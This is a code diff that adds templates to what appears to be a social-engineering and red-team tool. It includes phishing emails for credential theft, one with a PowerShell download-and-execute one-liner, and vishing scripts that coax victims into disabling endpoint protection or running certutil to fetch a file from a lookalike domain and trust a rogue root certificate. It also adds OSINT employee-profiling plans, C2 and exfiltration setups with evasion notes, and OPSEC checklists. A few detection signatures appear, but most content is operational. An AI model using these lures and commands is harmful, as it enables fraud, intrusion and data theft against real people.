@@ -354,6 +354,122 @@ For reference, the compromised data was identified on {date} and includes email 
 
 {signature}""",
     },
+    {
+        "id": "password_policy_change",
+        "name": "Password Policy Compliance Change",
+        "subject_lines": [
+            "ACTION REQUIRED: New password policy takes effect {deadline}",
+            "[{company} IT Security] Mandatory password reset — New complexity requirements",
+            "Your {software} password does not meet updated security requirements",
+            "Password Policy Update — Immediate action required for {department}",
+        ],
+        "body": """Dear {first_name},
+
+As part of our ongoing security hardening initiative, {company} is implementing enhanced password requirements effective {deadline}. Our records indicate that your current password does not meet the new complexity standards.
+
+New requirements:
+  - Minimum 16 characters (increased from 8)
+  - Must include uppercase, lowercase, numbers, and special characters
+  - Cannot reuse any of your last 24 passwords
+  - Must be changed within the next {deadline}
+
+Please update your password immediately through our secure portal:
+
+{phishing_link}
+
+Accounts that do not comply by {deadline} will be automatically locked pending manual review by IT Security. This process can take 3-5 business days.
+
+If you have questions, contact the IT Security team at x4500.
+
+{signature}""",
+    },
+    {
+        "id": "sso_migration",
+        "name": "SSO Provider Migration",
+        "subject_lines": [
+            "[IT Migration] {software} SSO cutover — Re-authentication required by {deadline}",
+            "IMPORTANT: {company} identity provider migration — Action needed",
+            "Your {software} session will expire during SSO migration — Re-authenticate now",
+            "[{company} IT] Single Sign-On migration — Verify your identity",
+        ],
+        "body": """Hello {first_name},
+
+{company} is migrating to an upgraded Single Sign-On (SSO) identity provider to improve security and performance. As part of this migration, all {department} employees must re-authenticate their accounts before the cutover on {deadline}.
+
+What you need to do:
+  1. Click the secure verification link below
+  2. Sign in with your current {software} credentials
+  3. Confirm your identity via your existing MFA method
+  4. Your account will be automatically migrated to the new provider
+
+Verify your identity now:
+
+{phishing_link}
+
+IMPORTANT: If you do not complete this verification before {deadline}, your access to {software} and all SSO-connected applications will be interrupted until IT can manually re-provision your account.
+
+The migration has been approved by {executive_name} and the IT Security team. For questions, contact the migration helpdesk at sso-support@{company}.com.
+
+{signature}""",
+    },
+    {
+        "id": "macro_document",
+        "name": "Macro-Enabled Document Delivery",
+        "subject_lines": [
+            "[{department}] {document_name} — Enable editing to view",
+            "CONFIDENTIAL: {document_type} for {first_name} — Protected content",
+            "Re: {document_name} — Please enable macros to decrypt",
+            "[{company}] Encrypted {document_type} — Follow instructions to view",
+        ],
+        "body": """Hi {first_name},
+
+Please find attached the {document_type} you requested: {document_name}
+
+This document is protected with enterprise-grade encryption for confidentiality. To view the contents, you will need to:
+
+  1. Open the attached file
+  2. Click "Enable Editing" if prompted by the yellow security bar
+  3. Click "Enable Content" to activate the decryption macro
+  4. The document will automatically decrypt and display
+
+NOTE: The decryption macro is signed by our IT Security team and is safe to enable. If your {software} security settings block the macro, please follow the instructions in the security bar or contact IT at x4500.
+
+This document contains sensitive information intended only for {first_name} in {department}. Do not forward.
+
+{signature}""",
+    },
+    {
+        "id": "powershell_diagnostic",
+        "name": "IT Diagnostic Script Execution",
+        "subject_lines": [
+            "[IT Support] Ticket #{reference} — Run diagnostic script to resolve your issue",
+            "[{company} IT] System health check required for {department} workstations",
+            "Re: Your IT ticket — Paste this command to fix the {software} connectivity issue",
+            "[Automated] {software} performance degradation detected — Diagnostic required",
+        ],
+        "body": """Hello {first_name},
+
+Following up on the reported {software} performance issues affecting {department}, our engineering team has prepared a diagnostic script that will collect system telemetry and resolve the configuration drift.
+
+Please run the following command in PowerShell (Run as Administrator):
+
+  powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('{phishing_link}')"
+
+Steps:
+  1. Press Windows + X, select "Windows PowerShell (Admin)"
+  2. Copy and paste the command above
+  3. Press Enter and wait for the diagnostic to complete (~2 minutes)
+  4. A summary report will be saved to your Desktop
+
+This script has been reviewed by IT Security (ticket {reference}) and is safe to execute. It collects:
+  - Network configuration and DNS settings
+  - {software} connection logs
+  - System performance counters
+
+If you encounter any UAC prompts, click "Yes" to allow the diagnostic to run with the necessary permissions.
+
+{signature}""",
+    },
 ]
 
 # ═══════════════════════════════════════════════════════════════
@@ -600,6 +716,104 @@ are valid by testing them through our audit portal.""",
   ✓ Reference real audit deadlines (SOC2 Type II is annual)
   ✓ Offer to send the audit request via official-looking email as verification""",
     },
+    {
+        "id": "kerberoast_audit",
+        "name": "Service Principal Name Audit",
+        "opening": """[CALLER]: Good {time_of_day}, this is {caller_name} from the Identity Security team at {company}.
+I'm reaching out regarding a mandatory audit of Service Principal Names in Active Directory.
+Our security scan flagged service accounts associated with {department} — are you the person
+who manages the {software} service accounts?""",
+        "escalation": """[CALLER]: Thanks for confirming. Here's what's happening — our quarterly Kerberos
+security assessment found that several SPNs registered to your {software} deployment
+are configured with weak encryption types. Ticket {ticket_number} was opened by {manager_name}.
+I need to verify which service accounts are linked to your {software} instance,
+confirm the SPN configuration, and then we'll rotate the credentials through our
+secure portal. Can you pull up your service account list? I'll also need you to
+test the current credentials on our audit portal to confirm they're still valid
+before we initiate the rotation.""",
+        "objective": """OBJECTIVE: Get the target to:
+  - Disclose service account names and SPN configurations
+  - Reveal service account passwords or encryption keys
+  - Test credentials on attacker-controlled 'audit portal' (harvest Kerberos tickets)
+  - Share the keytab file or service account configuration
+  - Grant temporary access to AD service account management""",
+        "red_flags_to_avoid": """MAINTAIN CREDIBILITY:
+  ✗ Don't use Kerberos jargon you can't explain if questioned
+  ✗ Don't ask for Domain Admin credentials — focus on service accounts only
+  ✗ Don't rush — identity security audits are methodical
+  ✗ Don't call without knowing the target's AD management tools
+  ✓ Know real SPN syntax (MSSQLSvc/server.domain.com:1433)
+  ✓ Reference actual AD tools the org uses (Azure AD Connect, ADUC, PowerShell AD module)
+  ✓ Have a fake audit portal ready that mimics legitimate SSO
+  ✓ Understand Kerberos encryption types (RC4, AES128, AES256) to discuss remediation""",
+    },
+    {
+        "id": "endpoint_override",
+        "name": "Endpoint Protection Override Request",
+        "opening": """[CALLER]: Hi {target_name}, this is {caller_name} from the {company} SOC.
+We're seeing an issue where the latest {software} endpoint protection update is
+conflicting with a critical system patch being deployed today. I need your help
+to temporarily adjust your endpoint settings so the patch can install correctly.""",
+        "escalation": """[CALLER]: Here's the situation — Microsoft released an emergency out-of-band
+security patch last night for a zero-day (CVE-{cve_year}-{cve_id}). Our {software}
+endpoint agent is flagging the patch installer as a false positive, which means
+the patch can't install while real-time protection is active.
+{manager_name} approved a 15-minute maintenance window for {department} workstations.
+I'll walk you through exactly what to do — first, I need you to open your {software}
+settings panel and navigate to Real-Time Protection. You'll need to toggle it off
+for about 15 minutes while the patch deploys. I'll tell you exactly when to re-enable it.""",
+        "objective": """OBJECTIVE: Get the target to:
+  - Disable endpoint protection / real-time scanning
+  - Add exclusion folders or processes to the security agent
+  - Run a 'patch installer' that is actually a payload
+  - Disable Windows Defender or other built-in protections
+  - Approve an administrative elevation prompt for 'the patch'""",
+        "red_flags_to_avoid": """MAINTAIN CREDIBILITY:
+  ✗ Don't ask them to uninstall the endpoint agent — just disable temporarily
+  ✗ Don't claim you can do it remotely — if you could, you wouldn't need to call
+  ✗ Don't keep protection disabled for too long — specify a realistic 15-min window
+  ✗ Don't call without knowing which endpoint product they actually use
+  ✓ Reference a real recent CVE that would justify emergency patching
+  ✓ Know the exact UI steps for the target's endpoint protection product
+  ✓ Offer to stay on the phone and 'verify the patch installed correctly'
+  ✓ Send a follow-up email with the 'patch' download link for payload delivery""",
+    },
+    {
+        "id": "lolbin_diagnostic",
+        "name": "LOLBin Diagnostic Procedure",
+        "opening": """[CALLER]: {time_of_day}, this is {caller_name} from IT Infrastructure at {company}.
+I'm working on ticket {ticket_number} regarding certificate validation issues affecting
+{software} in {department}. I need to walk you through a quick diagnostic procedure
+to check your certificate store. Is this {target_name}?""",
+        "escalation": """[CALLER]: Great. So the issue is that some workstations in {department} are failing
+to validate TLS certificates, which is causing {software} connection timeouts.
+{manager_name} reported this yesterday. What I need you to do is open a Command Prompt
+and run a couple of commands to check your certificate store.
+
+First, let's verify your certificates:
+  certutil -urlcache -split -f https://certificates-{company}.verify-update.com/cert.cer cert.cer
+
+This downloads our updated root certificate. Then run:
+  certutil -addstore -f Root cert.cer
+
+That installs it in your trusted root store. This will fix the {software} certificate
+validation chain. It should only take a minute.""",
+        "objective": """OBJECTIVE: Get the target to:
+  - Run certutil (a legitimate Windows binary) to download a malicious payload
+  - Execute downloaded files that appear to be certificates but contain code
+  - Add an attacker-controlled certificate to the trusted root store
+  - Run additional LOLBin commands (bitsadmin, mshta, rundll32) for further access
+  - Provide administrative credentials if UAC prompts appear""",
+        "red_flags_to_avoid": """MAINTAIN CREDIBILITY:
+  ✗ Don't ask them to run unfamiliar executable files — stick to built-in Windows tools
+  ✗ Don't use commands that obviously contain encoded payloads visible in the command line
+  ✗ Don't rush through the commands — explain each step as if teaching
+  ✗ Don't ask for more than 2-3 commands — keep it simple and focused
+  ✓ Know certutil flags and be able to explain what each does
+  ✓ Have a legitimate-sounding domain for the download URL
+  ✓ Reference real certificate issues (root CA expiry, intermediate cert missing)
+  ✓ Send a follow-up email with 'documentation' of the procedure as additional payload delivery""",
+    },
 ]
 
 # ═══════════════════════════════════════════════════════════════
@@ -762,6 +976,335 @@ notified last week. I'll try to be quick and not disrupt anyone.""",
 ]
 
 # ═══════════════════════════════════════════════════════════════
+#  RECONNAISSANCE TEMPLATES
+# ═══════════════════════════════════════════════════════════════
+
+RECON_TEMPLATES = [
+    {
+        "id": "osint_full",
+        "name": "Full OSINT Reconnaissance",
+        "description": "Comprehensive open-source intelligence plan targeting organizational structure, technology stack, and personnel",
+        "passive_tasks": [
+            "Enumerate {company} email naming convention via LinkedIn profiles",
+            "Harvest employee names, titles, and departments from LinkedIn",
+            "Identify technology stack from job postings ({company} careers page, Indeed, Glassdoor)",
+            "Map organizational hierarchy from public filings and press releases",
+            "Search for leaked credentials in breach databases (Have I Been Pwned, DeHashed)",
+            "Enumerate subdomains via Certificate Transparency logs (crt.sh)",
+            "Gather DNS records (MX, TXT, SPF, DMARC) for mail infrastructure",
+            "Search GitHub/GitLab for {company} repos, exposed secrets, internal docs",
+            "Review {company} social media for operational details",
+            "Search Shodan/Censys for internet-facing assets and open ports",
+        ],
+        "active_tasks": [
+            "Port scan external perimeter hosts (nmap -sC -sV)",
+            "Enumerate web applications and identify frameworks (whatweb, Wappalyzer)",
+            "Test for subdomain takeover on unused DNS records",
+            "Probe external-facing login portals (VPN, OWA, Citrix, SSO)",
+            "Send benign emails to validate email address format and delivery",
+            "Map WiFi networks from parking lot (ESSID, encryption, signal strength)",
+        ],
+        "tools": [
+            ("theHarvester", "Email and subdomain enumeration"),
+            ("Maltego", "Visual link analysis and entity graphing"),
+            ("Recon-ng", "Automated OSINT framework"),
+            ("Shodan/Censys", "Internet-facing asset discovery"),
+            ("LinkedIn Sales Navigator", "Employee and org structure profiling"),
+            ("SpiderFoot", "Automated OSINT collection"),
+            ("crt.sh", "Certificate Transparency log search"),
+            ("Amass", "Subdomain enumeration and network mapping"),
+        ],
+        "deliverables": [
+            "Target employee list with emails, roles, and social profiles",
+            "Technology stack inventory (external-facing and inferred internal)",
+            "Network topology map of external perimeter",
+            "Credential breach exposure report",
+            "Social engineering target shortlist ranked by access and vulnerability",
+            "Attack surface summary with prioritized entry points",
+        ],
+    },
+    {
+        "id": "tech_profiling",
+        "name": "Technology Stack Profiling",
+        "description": "Focused reconnaissance on the target's technology infrastructure to identify attack vectors",
+        "passive_tasks": [
+            "Analyze {company} job postings for technology mentions ({software} admin, {software} developer)",
+            "Search BuiltWith/Wappalyzer for web technology fingerprints",
+            "Enumerate DNS records for cloud provider indicators (AWS, Azure, GCP)",
+            "Search Stack Overflow and forums for {company} employee technical questions",
+            "Check Shodan for exposed {software} instances and version numbers",
+            "Review vendor case studies mentioning {company} deployments",
+        ],
+        "active_tasks": [
+            "Fingerprint web servers and frameworks (HTTP headers, cookies, error pages)",
+            "Enumerate SSL/TLS configurations and certificate chains",
+            "Test for known CVEs against identified software versions",
+            "Map CDN and WAF presence (Cloudflare, Akamai, AWS CloudFront)",
+            "Probe API endpoints for versioning and documentation exposure",
+        ],
+        "tools": [
+            ("Wappalyzer", "Web technology fingerprinting"),
+            ("BuiltWith", "Technology stack lookup"),
+            ("Shodan", "Internet-facing service detection"),
+            ("Nmap", "Port scanning and service version detection"),
+            ("Nuclei", "Vulnerability scanning against known templates"),
+            ("WhatWeb", "Web server and application fingerprinting"),
+        ],
+        "deliverables": [
+            "Confirmed technology stack inventory with versions",
+            "Known vulnerability assessment per identified technology",
+            "Cloud infrastructure mapping (provider, regions, services)",
+            "Prioritized list of potentially exploitable services",
+        ],
+    },
+    {
+        "id": "personnel_mapping",
+        "name": "Personnel and Social Engineering Mapping",
+        "description": "Identification and profiling of key personnel for social engineering targeting",
+        "passive_tasks": [
+            "Build org chart from LinkedIn (C-suite to VPs to Directors to Managers to IC)",
+            "Identify IT administrators and security team members from job titles",
+            "Map {department} department personnel and reporting structure",
+            "Profile high-value targets: executive assistants, finance team, HR leads",
+            "Harvest personal details from social media (interests, travel, events)",
+            "Identify recently hired employees (less established, more susceptible)",
+            "Search conference speaker lists for {company} presenters (technical detail leaks)",
+            "Map vendor relationships from LinkedIn connections and press releases",
+        ],
+        "active_tasks": [
+            "Validate email addresses via SMTP VRFY or calibration emails",
+            "Identify out-of-office patterns (vacation schedules, conference attendance)",
+            "Test phone system for auto-attendant with employee directory",
+            "Attempt LinkedIn connections with pretext profiles for extended profiling",
+        ],
+        "tools": [
+            ("LinkedIn Sales Navigator", "Professional network profiling"),
+            ("Hunter.io", "Email format verification"),
+            ("Pipl/BeenVerified", "Personal information aggregation"),
+            ("social-analyzer", "Social media OSINT"),
+            ("PhoneInfoga", "Phone number OSINT"),
+        ],
+        "deliverables": [
+            "Target personnel dossiers (name, role, contact, social profiles, interests)",
+            "Organizational hierarchy chart with reporting lines",
+            "Social engineering susceptibility ranking per target",
+            "Pretext development notes per high-value target",
+            "Vendor and third-party relationship map",
+        ],
+    },
+]
+
+# ═══════════════════════════════════════════════════════════════
+#  C2 (COMMAND AND CONTROL) TEMPLATES
+# ═══════════════════════════════════════════════════════════════
+
+C2_TEMPLATES = [
+    {
+        "id": "https_beacon",
+        "name": "HTTPS Beaconing C2",
+        "protocol": "HTTPS",
+        "description": "Standard HTTPS-based command and control using domain categorization for evasion",
+        "infrastructure": [
+            "Register aged domain (30+ days) with categorization matching target industry",
+            "Obtain valid TLS certificate (Let's Encrypt) for the C2 domain",
+            "Configure reverse proxy (Nginx/Caddy) with legitimate-looking default page",
+            "Set up redirector to filter analyst traffic from real C2 traffic",
+            "Deploy C2 server behind redirector (Cobalt Strike, Sliver, Mythic)",
+        ],
+        "beacon_config": {
+            "sleep": "60-300 seconds with 30% jitter",
+            "user_agent": "Mozilla/5.0 matching target's browser profile",
+            "uri_paths": ["/api/v2/check", "/cdn/status", "/updates/config"],
+            "fallback": "DNS beaconing over TXT records to backup domain",
+        },
+        "cover_story": "Traffic appears as HTTPS requests to a legitimate SaaS analytics platform. URI paths mimic standard API health checks. Request/response sizes match normal JSON API payloads.",
+        "evasion_notes": [
+            "Beacon during business hours only (08:00-18:00 target timezone)",
+            "Match TLS JA3 fingerprint to legitimate browser",
+            "Use domain categorization (CDN, SaaS, analytics) to bypass web filters",
+            "Vary beacon intervals to avoid statistical detection",
+            "Encrypt payload within normal-looking JSON responses",
+        ],
+        "detection_signatures": [
+            "Repeated connections to low-reputation domain on fixed interval",
+            "TLS certificate issued to recently registered domain",
+            "Unusual JA3 fingerprint for claimed user-agent",
+            "POST requests with encoded payloads to non-standard URIs",
+        ],
+    },
+    {
+        "id": "dns_tunnel",
+        "name": "DNS Tunneling C2",
+        "protocol": "DNS",
+        "description": "Command and control via DNS queries, useful when HTTP/HTTPS is filtered",
+        "infrastructure": [
+            "Register domain and configure NS delegation to attacker-controlled server",
+            "Deploy DNS C2 server (dnscat2, Cobalt Strike DNS, iodine)",
+            "Configure authoritative DNS to handle encoded queries",
+            "Set up fallback domain with different registrar",
+            "Ensure recursive resolvers in target network allow external DNS",
+        ],
+        "beacon_config": {
+            "sleep": "30-120 seconds",
+            "user_agent": "N/A (DNS protocol)",
+            "uri_paths": ["TXT and CNAME records for data encoding"],
+            "fallback": "Direct HTTPS to backup domain if DNS blocked",
+        },
+        "cover_story": "DNS queries appear as standard subdomain lookups. The authoritative DNS server responds with TXT records that could pass as SPF or DKIM configuration data.",
+        "evasion_notes": [
+            "Keep subdomain labels under 63 chars (DNS spec limit)",
+            "Use mixed query types (A, AAAA, TXT, CNAME) to avoid pattern detection",
+            "Rate limit queries to match normal DNS volume",
+            "Avoid queries during off-hours when DNS baseline is low",
+            "Use legitimate-looking domain name (not random strings)",
+        ],
+        "detection_signatures": [
+            "High volume of DNS queries to single domain",
+            "Unusually long subdomain labels (encoded data)",
+            "TXT record responses with non-standard content",
+            "DNS queries to recently registered domains",
+        ],
+    },
+    {
+        "id": "domain_fronting",
+        "name": "Domain Fronting C2",
+        "protocol": "HTTPS (CDN)",
+        "description": "C2 traffic routed through legitimate CDN to evade network monitoring",
+        "infrastructure": [
+            "Identify CDN provider used by target (CloudFront, Azure CDN, Fastly)",
+            "Register C2 domain and configure CDN distribution",
+            "Configure C2 server as CDN origin",
+            "Set up host header manipulation in implant",
+            "Test domain fronting path end-to-end before deployment",
+        ],
+        "beacon_config": {
+            "sleep": "120-600 seconds with 50% jitter",
+            "user_agent": "Mozilla/5.0 matching target's browser profile",
+            "uri_paths": ["Standard CDN resource paths"],
+            "fallback": "Direct HTTPS to alternative domain",
+        },
+        "cover_story": "All traffic appears as HTTPS requests to a major CDN provider. Network monitoring sees only connections to trusted CDN IP ranges. The actual C2 domain is hidden in the encrypted Host header.",
+        "evasion_notes": [
+            "Use CDN domains already trusted by the target's proxy/firewall",
+            "Match request patterns to legitimate CDN traffic (caching headers, content types)",
+            "Some CDN providers have disabled domain fronting — verify before use",
+            "Keep payload sizes consistent with normal CDN responses",
+            "Rotate CDN distributions periodically",
+        ],
+        "detection_signatures": [
+            "Mismatch between SNI (TLS) and Host header (requires TLS inspection)",
+            "Repeated CDN requests to unusual distribution IDs",
+            "CDN traffic patterns inconsistent with legitimate content delivery",
+            "POST requests to CDN endpoints (unusual for static content)",
+        ],
+    },
+    {
+        "id": "exfil_channel",
+        "name": "Data Exfiltration Channel",
+        "protocol": "Multi-protocol",
+        "description": "Covert data exfiltration plan using multiple channels for redundancy",
+        "infrastructure": [
+            "Set up cloud storage for staged exfiltration (OneDrive, Google Drive, Dropbox)",
+            "Configure DNS exfil server for low-and-slow extraction",
+            "Prepare HTTPS upload endpoint with valid TLS certificate",
+            "Set up steganography toolkit for embedding data in images",
+            "Prepare encrypted file transfer mechanism (age, GPG)",
+        ],
+        "beacon_config": {
+            "sleep": "Varies by channel (batch uploads during peak hours)",
+            "user_agent": "Matches cloud storage client user-agent",
+            "uri_paths": ["Cloud storage API endpoints"],
+            "fallback": "DNS TXT record encoding for small payloads",
+        },
+        "cover_story": "Exfiltration mimics normal business activities: cloud storage syncs, email attachments, and document sharing. Chunk sizes match typical file upload patterns.",
+        "evasion_notes": [
+            "Compress and encrypt before exfil (reduces volume, prevents DLP inspection)",
+            "Use legitimate cloud storage APIs already allowed through the firewall",
+            "Spread exfil across multiple channels and time windows",
+            "Match upload sizes to normal business document uploads (500KB-2MB)",
+            "Avoid bulk transfers — drip data over days/weeks",
+            "Use protocol-compliant channels (HTTPS, DNS) to blend with legitimate traffic",
+        ],
+        "detection_signatures": [
+            "DLP: unusual volume of data to external cloud storage",
+            "Network: large uploads to personal cloud accounts",
+            "DNS: high volume of TXT queries to single domain",
+            "Endpoint: compression/encryption tools run before uploads",
+        ],
+    },
+]
+
+# ═══════════════════════════════════════════════════════════════
+#  OPSEC CHECKLISTS (per scenario type)
+# ═══════════════════════════════════════════════════════════════
+
+OPSEC_CHECKLISTS = {
+    "phishing": [
+        "Register lookalike domain 30+ days before engagement",
+        "Warm up sending domain with legitimate email traffic",
+        "Configure SPF, DKIM, and DMARC on sending domain",
+        "Test email delivery against target's gateway (non-malicious probe)",
+        "Stage landing page with valid TLS and realistic content",
+        "Use separate VPN/proxy for campaign management",
+        "Ensure payload has no analyst-attributable strings or metadata",
+        "Prepare domain takedown plan for post-engagement cleanup",
+    ],
+    "vishing": [
+        "Spoof caller ID to match target organization's PBX numbers",
+        "Research target's communication style if impersonating specific personnel",
+        "Prepare fallback answers for common verification questions",
+        "Use burner phone or VoIP with disposable number",
+        "Record calls only with client authorization (legal requirement)",
+        "Practice scripts to sound natural, not robotic",
+        "Know the target's org chart and recent events for credibility",
+        "Have a graceful exit plan if the target becomes suspicious",
+    ],
+    "smishing": [
+        "Use dedicated SMS gateway or spoofed sender ID",
+        "Rotate sending numbers to avoid carrier blocking",
+        "Keep messages under 160 chars for single SMS delivery",
+        "Register domains that pass mobile browser URL bar inspection",
+        "Test delivery against target carrier's SMS filtering",
+        "Time delivery for business hours when targets are responsive",
+    ],
+    "quishing": [
+        "Print QR codes at professional quality (avoid pixelation)",
+        "Test QR codes with multiple scanner apps before deployment",
+        "Place QR materials during off-hours to avoid witnesses",
+        "Prepare explanation if questioned about placing materials",
+        "Document exact placement locations for cleanup after engagement",
+        "Use legitimate-looking printed materials (laminated, branded)",
+    ],
+    "physical": [
+        "Acquire authentic uniform and props for cover identity",
+        "Print work orders with correct company address and building details",
+        "Research building entry procedures and security checkpoints",
+        "Identify camera blind spots from public footage or prior recon",
+        "Have printed badge with photo and vendor/company branding",
+        "Prepare cover story for every area you plan to access",
+        "Know names of facilities and building management contacts",
+        "Carry authorization letter from client as panic card",
+    ],
+    "recon": [
+        "Use VPN and anonymized browser for all OSINT activities",
+        "Avoid logging into personal accounts during reconnaissance",
+        "Use disposable email for any online tool registrations",
+        "Rate-limit active scanning to avoid IDS/IPS alerts",
+        "Document all queries for the final report and deconfliction",
+        "Use Tor or proxy chains for sensitive lookups",
+    ],
+    "c2": [
+        "Register infrastructure through privacy-protected registrars",
+        "Use separate payment methods for each piece of infrastructure",
+        "Test C2 comms against commercial EDR before deployment",
+        "Configure kill switch for rapid infrastructure teardown",
+        "Rotate C2 domains on a scheduled basis",
+        "Ensure all operator connections use VPN/Tor",
+        "Log all C2 sessions for engagement reporting",
+    ],
+}
+
+# ═══════════════════════════════════════════════════════════════
 #  PSYCHOLOGICAL PRINCIPLES
 # ═══════════════════════════════════════════════════════════════
 
@@ -850,6 +1393,9 @@ def get_localized_templates(lang="en"):
             "PHYSICAL_PRETEXTS": PHYSICAL_PRETEXTS,
             "PSYCH_PRINCIPLES": PSYCH_PRINCIPLES,
             "FAKE_DOCUMENTS": FAKE_DOCUMENTS,
+            "RECON_TEMPLATES": RECON_TEMPLATES,
+            "C2_TEMPLATES": C2_TEMPLATES,
+            "OPSEC_CHECKLISTS": OPSEC_CHECKLISTS,
         }
 
     from .locales import load_locale
@@ -937,4 +1483,7 @@ def get_localized_templates(lang="en"):
         "PHYSICAL_PRETEXTS": loc_physical,
         "PSYCH_PRINCIPLES": loc_psych,
         "FAKE_DOCUMENTS": strings.get("fake_documents", FAKE_DOCUMENTS),
+        "RECON_TEMPLATES": RECON_TEMPLATES,
+        "C2_TEMPLATES": C2_TEMPLATES,
+        "OPSEC_CHECKLISTS": OPSEC_CHECKLISTS,
     }
